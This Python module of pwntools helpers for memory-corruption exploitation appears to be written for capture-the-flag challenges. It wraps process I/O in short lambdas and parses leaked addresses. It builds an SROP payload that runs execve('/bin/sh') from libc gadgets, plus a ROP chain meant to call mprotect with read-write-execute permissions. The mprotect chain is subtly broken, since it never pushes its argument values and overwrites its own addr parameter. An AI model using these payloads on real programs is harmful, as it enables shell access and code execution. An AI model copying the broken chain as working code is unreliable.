#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
from pwn import *

import __main__

# Logging utilities
info = lambda msg: log.info(msg)
slog = lambda name, addr: log.success(': '.join([name, hex(addr)]))

# Send utilities
s = lambda data: __main__.p.send(data)
sa = lambda msg, data: __main__.p.sendafter(msg, data)
sl = lambda data: __main__.p.sendline(data)
sla = lambda msg, data: __main__.p.sendlineafter(msg, data)
sn = lambda num: __main__.p.send(str(num).encode())
sna = lambda msg, num: __main__.p.sendafter(msg, str(num).encode())
sln = lambda num: __main__.p.sendline(str(num).encode())
slna = lambda msg, num: __main__.p.sendlineafter(msg, str(num).encode())

# Receive utilities
r = lambda data: __main__.p.recv(data)
ru = lambda until, drop=False: __main__.p.recvuntil(until, drop=drop)
rl = lambda: __main__.p.recvline()
rlc = lambda data: __main__.p.recvline_contains(data)
rb = lambda n_bytes: __main__.p.recv(n_bytes)

# New Receive utilities
rnb = lambda n_bytes: __main__.p.recvn(n_bytes)

# Interaction
interactive = lambda: __main__.p.interactive()

# Additional utilities
encode = lambda e: e if isinstance(e, bytes) else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l.ljust(8, b"\x00"))

# call system using SROP
def system(padding = 0):
    libc = __main__.libc
    rop = ROP(libc, base=libc.address)

    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    binsh = next(libc.search(b'/bin/sh'))
    syscall = rop.find_gadget(['syscall'])[0]

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = binsh
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall

    payload = flat(
        b'A' * padding,
        pop_rax,
        0xf,
        syscall
    )

    payload += bytes(frame)
    print("Length of payload:", len(payload), f"({hex(len(payload))})")

    return payload

def call_mprotect(addr, size=0x1000, prot=7):

    libc = __main__.libc
    rop = ROP(libc, base=libc.address)

    gadgets = {
        'pop rdi': addr,
        'pop rsi': size,
        'pop rdx': prot,
        'mprotect': libc.sym['mprotect']
    }

    chain = b''
    for gadget, value in gadgets.items():
        try:
            addr = rop.find_gadget([gadget])[0] if 'pop' in gadget else value
            chain += p64(addr)
        except:
            log.error(f"Missing {gadget}!")

    return chain
